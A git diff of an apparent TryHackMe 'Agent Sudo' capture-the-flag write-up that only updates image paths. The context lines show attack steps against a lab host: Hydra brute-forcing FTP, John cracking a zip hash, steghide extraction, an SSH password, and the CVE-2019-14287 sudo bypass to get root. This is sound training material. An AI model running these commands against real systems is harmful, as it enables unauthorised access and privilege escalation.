@@ -5,7 +5,7 @@ date: 2024-10-31 00:00:00 +0000
 categories: [TryHackMe]
 tags: [tryhackme, linux, web, privesc, bruteforce, hydra, suid, john, crack, gobuster]
 image:
-    path: /assets/img/Agent_sudo/0.png
+    path: /assets/img/try%20hack%20me%20/Easy/Agent_sudo/0.png
     alt: Agent sudo
 ---
 
@@ -73,12 +73,12 @@ Nothing much
 
 ### surf the web
 
-![](/assets/img/Agent_sudo/1.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/1.png)
 
 Let's try spoofing as C and get the same URL with curl.  
 -A allows us to spoof the user agent and -L follows any redirects.
 
-![](/assets/img/Agent_sudo/2.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/2.png)
 
 Now we have a user `chris` but not sure it's for ssh or ftp.
 
@@ -90,7 +90,7 @@ hydra -L users.txt -P passwords.txt <IP> ftp
 # hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.55.182 ftp
 ```
 
-![](/assets/img/Agent_sudo/3.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/3.png)
 
 ## Result
 ftp details  
@@ -101,11 +101,11 @@ log in!!!
 ftp chris@10.10.55.182 
 ```
 
-![](/assets/img/Agent_sudo/4.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/4.png)
 
 
 we got the file, concatenate it:  
-![](/assets/img/Agent_sudo/5.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/5.png)
 
 
 Will have to go back and get the images. We run binwalk on the png file which is the most likely to contain some hidden files.
@@ -124,7 +124,7 @@ zip2john 8702.zip > forjohn
 john forjohn.txt
 ```
 
-![](/assets/img/Agent_sudo/6.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/6.png)
 
 Password = alien  
 Unzip the files. 
@@ -143,7 +143,7 @@ steghide extract -sf cute-alien.jpg
 cat message.txt
 ```
 
-![](/assets/img/Agent_sudo/10.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/10.png)
 
 
 ### Details
@@ -157,11 +157,11 @@ Details
  ssh james@10.10.55.182 
 # password = hackerrules!
 ```
-![](/assets/img/Agent_sudo/7.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/7.png)
 
 ## Privilege escalation
 Run sudo -l  
-![](/assets/img/Agent_sudo/8.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/8.png)
 
 Google search for the exploit: CVE:2019-14287  
 In the exploit page, we get:  
@@ -169,4 +169,4 @@ In the exploit page, we get:
  'sudo -u #-1 /bin/bash'
  #Read the root flag. 
 ```
-![](/assets/img/Agent_sudo/9.png)
+![](/assets/img/try%20hack%20me%20/Easy/Agent_sudo/9.png)
